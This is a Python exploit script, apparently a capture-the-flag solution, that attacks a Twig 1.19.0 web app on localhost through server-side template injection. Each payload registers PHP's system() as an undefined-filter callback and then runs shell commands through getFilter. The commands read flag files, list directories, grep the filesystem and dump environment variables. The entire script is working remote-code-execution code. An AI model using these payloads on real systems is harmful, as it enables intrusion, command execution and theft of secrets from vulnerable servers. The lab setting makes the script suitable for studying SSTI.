import requests
import re

BASE_URL = "http://127.0.0.1:8080/"

print("[*] Twig 1.19.0 SSTI RCE - FLAG Extraction")
print("[*] Confirmed RCE via: registerUndefinedFilterCallback + getFilter")
print("=" * 80)

# The working technique:
# {{_self.env.registerUndefinedFilterCallback('FUNC')}}{{_self.env.getFilter('COMMAND')}}
# getFilter() calls the registered callback with the filter name as argument

flag_extraction_payloads = [
    # Try different locations for flag
    ("{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('cat /flag')}}", 
     "cat /flag"),
    
    ("{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('cat /flag.txt')}}", 
     "cat /flag.txt"),
    
    ("{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('cat flag')}}", 
     "cat flag"),
    
    ("{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('cat flag.txt')}}", 
     "cat flag.txt"),
    
    # List files to find flag
    ("{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('ls -la /')}}", 
     "ls -la /"),
    
    ("{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('ls -la /var/www/html')}}", 
     "ls -la /var/www/html"),
    
    ("{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('ls -la')}}", 
     "ls -la current directory"),
    
    ("{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('find / -name flag* 2>/dev/null')}}", 
     "find flag files"),
    
    ("{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('find / -name *flag* 2>/dev/null')}}", 
     "find any flag files"),
    
    # Try grep for FLAG
    ("{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('grep -r FLAG /var/www/html 2>/dev/null')}}", 
     "grep FLAG in web root"),
    
    ("{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('grep -r FLAG / 2>/dev/null')}}", 
     "grep FLAG in root"),
    
    # Check environment variables
    ("{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('env')}}", 
     "environment variables"),
    
    # Read common flag locations
    ("{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('cat /tmp/flag')}}", 
     "cat /tmp/flag"),
    
    ("{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('cat /home/flag')}}", 
     "cat /home/flag"),
    
    ("{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('cat /root/flag')}}", 
     "cat /root/flag"),
]

flag_found = False

for payload, description in flag_extraction_payloads:
    try:
        response = requests.post(
            BASE_URL,
            data={'name': payload},
            timeout=15
        )
        
        print(f"\n[TEST] {description}")
        print(f"Payload: {payload}")
        print(f"Status: {response.status_code} | Length: {len(response.text)}B")
        
        # Check for FLAG pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            flag_found = True
            print(f"\n{'='*80}")
            print(f"[!!!!! FLAG FOUND !!!!!]")
            print(f"{'='*80}")
            print(f"Flag: {flag_match.group(0)}")
            print(f"\nFull Response:\n{response.text}")
            print(f"{'='*80}")
            break
        
        # Print response to see what we got
        # Extract just the interesting part (before the Twig version info)
        if '<strong>' in response.text:
            content = response.text.split('<strong>')[1].split('</strong>')[0].strip()
            if content and len(content) < 500:
                print(f"Output: {content}")
            elif content:
                print(f"Output (first 500 chars): {content[:500]}")
        else:
            print(f"Response snippet: {response.text[:300]}")
    
    except Exception as e:
        print(f"[ERROR] {description}: {str(e)}")

print("\n" + "=" * 80)
if flag_found:
    print("[SUCCESS] Flag extracted!")
else:
    print("[*] FLAG not found in tested locations")
    print("[*] Need to explore filesystem further")

